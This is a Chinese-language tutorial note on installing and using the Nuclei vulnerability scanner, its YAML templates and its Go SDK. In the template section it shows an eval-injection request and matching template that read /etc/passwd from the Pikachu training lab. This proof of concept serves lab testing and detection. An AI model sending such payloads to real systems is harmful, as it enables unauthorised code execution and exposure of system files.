---
date: 2024-11-19
---

# nuclei

---

- [nuclei](#nuclei)
  - [安装](#安装)
  - [templates](#templates)
    - [更新 templates](#更新-templates)
    - [template 示例](#template-示例)
  - [Go SDK](#go-sdk)
    - [安装 Nuclei Go SDK](#安装-nuclei-go-sdk)
    - [使用 Nuclei Library/SDK 的基础示例](#使用-nuclei-librarysdk-的基础示例)

---

> [projectdiscovery/nuclei：Nuclei 是一款快速、可定制的漏洞扫描器，由全球安全社区提供支持，并构建在简单的基于 YAML 的 DSL 上，支持协作解决互联网上的趋势漏洞。它可以帮助您查找应用程序、API、网络、DNS 和云配置中的漏洞。 --- projectdiscovery/nuclei: Nuclei is a fast, customizable vulnerability scanner powered by the global security community and built on a simple YAML-based DSL, enabling collaboration to tackle trending vulnerabilities on the internet. It helps you find vulnerabilities in your applications, APIs, networks, DNS, and cloud configurations.](https://github.com/projectdiscovery/nuclei)

Nuclei 是一款现代的高性能漏洞扫描器，它利用简单的基于 YAML 的模板。它使您能够设计模仿现实世界条件的自定义漏洞检测场景，从而实现零误报。

- 使用简单 YAML 格式用于创建和自定义漏洞模板
- 由数千名安全专业人员贡献，以解决热门漏洞
- 通过模拟真实世界的步骤来验证漏洞从而降低误报
- 超快并行扫描处理和请求聚类
- 集成到 CI/CD 管道中进行漏洞检测和回归测试
- 支持多种协议，如 TCP、DNS、HTTP、SSL、WHOIS JavaScript、代码等
- 集成 Jira、Splunk、GitHub、Elastic、GitLab。

---

官方推荐将 nuclei 作为独立命令行工具使用而非作为服务运行, 否则可能存在安全风险

---

## 安装

:::tabs

@tab:active Go

```bash
go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest
```

> - 成功安装 Nuclei 需要最新的 GO 版本
> - 这条命令会触发拉取很多依赖库, 时间可能会比较长

---

@tab 二进制文件

直接在 `https://github.com/projectdiscovery/nuclei/releases` 下载对应的可执行程序

![image-20241119112516136](http://cdn.ayusummer233.top/DailyNotes/202411191125297.png)

![image-20241119142714714](http://cdn.ayusummer233.top/DailyNotes/202411191427019.png)

![image-20241119142743183](http://cdn.ayusummer233.top/DailyNotes/202411191427294.png)

![image-20241119142816477](http://cdn.ayusummer233.top/DailyNotes/202411191428521.png)

> 这里没有模板的话可以 clone 模板仓库到上述提示的目录里， 例如：
>
> ```bash
> git clone https://github.com/projectdiscovery/nuclei-templates.git /Users/summery233/nuclei-templates
> ```
>
> ![image-20241125150300156](http://cdn.ayusummer233.top/DailyNotes/202411251503331.png)

![image-20241119142847834](http://cdn.ayusummer233.top/DailyNotes/202411191428890.png)

可以给程序目录加个 PATH:

![image-20241119153635903](http://cdn.ayusummer233.top/DailyNotes/202411191536008.png)

> macOS:
>
> ```bash
> # echo 'export PATH=$PATH:/路径/到/nuclei目录' >> ~/.zshrc
> echo 'export PATH=$PATH:/Users/summery233/Documents/Tools/nuclei_3.3.6_macOS_arm64' >> ~/.zshrc
> source ~/.zshrc
> ```
>
> 或者类似这样写也可以：
>
> ```bash
> NucleiPath="/Users/summery233/Documents/Tools/nuclei_3.3.6_macOS_arm64"
> export PATH=$PATH:$NucleiPath
> ```

:::

---

## templates

> [projectdiscovery/nuclei-templates: 社区维护的 nuclei 引擎模板列表，用于发现安全漏洞。 --- projectdiscovery/nuclei-templates: Community curated list of templates for the nuclei engine to find security vulnerabilities.](https://github.com/projectdiscovery/nuclei-templates)

 Template 是 nuclei 扫描器的核心, 它驱动着实际的扫描引擎。[projectdiscovery/nuclei-templates: Community curated list of templates for the nuclei engine to find security vulnerabilities.](https://github.com/projectdiscovery/nuclei-templates) 存储和托管官方团队提供的以及社区贡献的各种扫描器模板。

---

### 更新 templates

```bash
# macOS 默认存放 nuclei 模板的位置在 ~/nuclei-templates
nuclei -update-templates -templates ~/nuclei-templates -v
```

> PS: 在仓库目录下 `git pull`  提示已经最新并不一定是最新的， nuclei 模板似乎有其他的更新源，直接使用上述命令更新排错即可

如果报错如下：

![image-20241125165726067](http://cdn.ayusummer233.top/DailyNotes/202411251657124.png)

> [Unable to update template #7129](https://github.com/projectdiscovery/nuclei-templates/issues/7129)

则需要去 GitHub 上创建一个 Token 然后设置环境变量

```bash
export GITHUB_TOKEN=[生成的GitHub token]
```

![image-20241125171118253](http://cdn.ayusummer233.top/DailyNotes/202411251711308.png)

---

### template 示例

---

下面是一个简单的 HTTP 类型漏洞的 Nuclei  Template 示例:

```yaml
id: example-vulnerability # 模板的唯一标识符

info: # 模板的基本信息
  name: 示例漏洞检测 # 模板名称,简要描述模板的功能。
  author: 安全研究员 # 作者名称
  severity: medium # 漏洞严重程度,可选值为 info、low、medium、high、critical。
  description: 检测示例漏洞的模板 # 模板描述
  reference:
    - https://example.com/vulnerability # 参考链接
  tags: 示例,漏洞 # 模板标签，便于分类

http: # 定义 HTTP 请求的列表
  - method: GET # HTTP 请求方法
    path:
      - "{{BaseURL}}/vulnerable/path" # 请求路径，{{BaseURL}} 为目标基 URL
    headers: # 请求头（可选）
      User-Agent: Nuclei Scanner
    matchers-condition: and # 匹配条件（and/or）
    matchers:
      - type: word # 匹配器类型：关键字匹配;(可选值: word（关键字匹配）、regex（正则匹配）、status（状态码匹配）)
        part: body # 匹配响应的部分（此处为响应体）(可选body（响应体）、header（响应头）等)
        words:
          - "Vulnerable response" # 要匹配的关键字
      - type: status
        status:
          - 200 # 预期的 HTTP 状态码
```

在上述模板中，工具将向目标的 `/vulnerable/path` 发送一个 GET 请求。匹配器将检查响应状态码是否为 200（正常响应），并且响应体中是否包含关键字 `"Vulnerable response"`。只有在满足所有匹配条件的情况下，模板才认为目标存在该漏洞。

---

例如将如下 Pikachu RCE EXEC Eval 的 HTTP 请求改成 nuclei template

```http
POST /vul/rce/rce_eval.php HTTP/1.1
Host: 192.168.1.215:9221
Content-Length: 82
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://192.168.1.215:9221/vul/rce/rce_eval.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=9tru1fbi3fto5uguhu9fd395ie
Connection: close

txt=echo+file_get_contents%28%27%2Fetc%2Fpasswd%27%29%3B&submit=%E6%8F%90%E4%BA%A4
```

---

```yaml
id: pikachu_rce_eval_cat_password # 模板的唯一标识符

info:
  name: PikachuRCEEval # 模板名称
  author: 233 # 作者名称
  severity: high # 漏洞严重程度
  description: |
    pikachu_rce_eval_cat_password 检测 /vul/rce/rce_eval.php 路径下是否存在远程命令执行漏洞，通过提交恶意命令并检查响应内容。
  reference:
    - "https://gitlab.hillstonenet.com/a-dlab/adlab-wiki/-/blob/main/漏洞信息库/命令执行类/命令执行_pikachu-rce-exec-eval/命令执行_pikachu-rce-exec-eval.md" # 参考链接
  tags: rce,PHP,pikachu

http:
  - method: POST # HTTP 请求方法
    path:
      - "{{BaseURL}}/vul/rce/rce_eval.php" # 请求路径，{{BaseURL}} 为目标基 URL
    headers:
      Content-Length: "82" # 内容长度
      Cache-Control: "max-age=0" # 缓存控制
      Upgrade-Insecure-Requests: "1" # 升级不安全请求
      Content-Type: "application/x-www-form-urlencoded" # 内容类型
      User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36" # 用户代理
      Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9" # 接受的内容类型
      Referer: "{{BaseURL}}/vul/rce/rce_eval.php" # 引用页
      Accept-Encoding: "gzip, deflate" # 接受的编码
      Accept-Language: "zh-CN,zh;q=0.9" # 接受的语言
      Cookie: "PHPSESSID=9tru1fbi3fto5uguhu9fd395ie" # Cookie
      Connection: "close" # 连接方式
    body: "txt=echo+file_get_contents%28%27%2Fetc%2Fpasswd%27%29%3B&submit=%E6%8F%90%E4%BA%A4" # 请求体
    matchers-condition: and # 匹配条件
    matchers:
      - type: word # 匹配器类型：关键字匹配
        part: body # 匹配响应体
        words:
          - "root:x:0:0:" # 用于确认 /etc/passwd 内容的关键字
      - type: status # 匹配器类型：状态码匹配
        status:
          - 200 # 预期的 HTTP 状态码
```

然后可以用 nuclei 跑这个 template:

```bash
nuclei -u http://192.168.1.215:9221 -t poc/rce/pikachu_rce_eval.yaml
```

![image-20241122150629171](http://cdn.ayusummer233.top/DailyNotes/202411221506408.png)

---

## Go SDK

> [nuclei 包 - github.com/projectdiscovery/nuclei/v3/lib - Go 包 --- nuclei package - github.com/projectdiscovery/nuclei/v3/lib - Go Packages](https://pkg.go.dev/github.com/projectdiscovery/nuclei/v3@v3.1.10/lib#section-readme)

Nuclei 主要是一个 CLI 工具，但随着越来越多的用户希望将其作为库在自己的自动化中使用，其在 v3 中添加了一个简化的 nuclei 库/SDK

---

### 安装 Nuclei Go SDK

使用以下命令将 nuclei 作为库添加到 go 项目中:

```bash
go get -u github.com/projectdiscovery/nuclei/v3/lib
```

> `-u`  表示更新包及其依赖项到最新版本
>
> 相应的， 这意味着忽略本地缓存直接从互联网下载最新的库， 如果本地存在相同的库也会被覆盖更新
>
> - Go 语言使用模块缓存（通常位于 `$GOPATH/pkg/mod`），用于存储下载的依赖项。
> - Go 的模块缓存是全局共享的，同一用户下的所有项目都会使用同一个缓存。
> - 在不使用 `-u` 参数的情况下，Go 会尝试从本地缓存中读取模块，避免重复下载。
>
> 所以当已知不需要重新下载最新模块时建议省略 `-u` 来复用缓存
>
> ```bash
> go get github.com/projectdiscovery/nuclei/v3/lib
> ```

---

或者将如下导入语句写到 Go 文件中交给 IDE 自动解析下载依赖

```bash
import nuclei "github.com/projectdiscovery/nuclei/v3/lib"
```

---

### 使用 Nuclei Library/SDK 的基础示例

```go
// create nuclei engine with options
	ne, err := nuclei.NewNucleiEngine(
		nuclei.WithTemplateFilters(nuclei.TemplateFilters{Severity: "critical"}), // run critical severity templates only
	)
	if err != nil {
		panic(err)
	}
	// load targets and optionally probe non http/https targets
	ne.LoadTargets([]string{"scanme.sh"}, false)
	err = ne.ExecuteWithCallback(nil)
	if err != nil {
		panic(err)
	}
	defer ne.Close()
```

> PS: 需要额外指定 `certmagic` 包， 否则会有类似如下报错
>
> > [When using nuclei as golang libaray, An error has occurred #5310](https://github.com/orgs/projectdiscovery/discussions/5310)
>
> ```bash
> /Users/summery233/go/pkg/mod/github.com/projectdiscovery/interactsh@v1.2.2/pkg/server/acme/acme_certbot.go:39:3: unknown field DNSProvider in struct literal of type certmagic.DNS01Solver
> /Users/summery233/go/pkg/mod/github.com/projectdiscovery/interactsh@v1.2.2/pkg/server/acme/acme_certbot.go:40:3: unknown field Resolvers in struct literal of type certmagic.DNS01Solver
> ```
>
> ```bash
> # 更新 certmagic 包
> go get -u github.com/caddyserver/certmagic@v0.20.0
> ```
>
> ![image-20241125164544292](http://cdn.ayusummer233.top/DailyNotes/202411251645393.png)

![image-20241125171350401](http://cdn.ayusummer233.top/DailyNotes/202411251713499.png)

> - `[INF] Templates clustered: 7 (Reduced 4 Requests)`：程序对7个模板进行了聚合，减少了4个请求，以提高扫描效率。
> - `[INF] Using Interactsh Server: oast.pro`：程序正在使用Interactsh服务器`oast.pro`，用于捕获带外（Out-of-Band）交互信息





























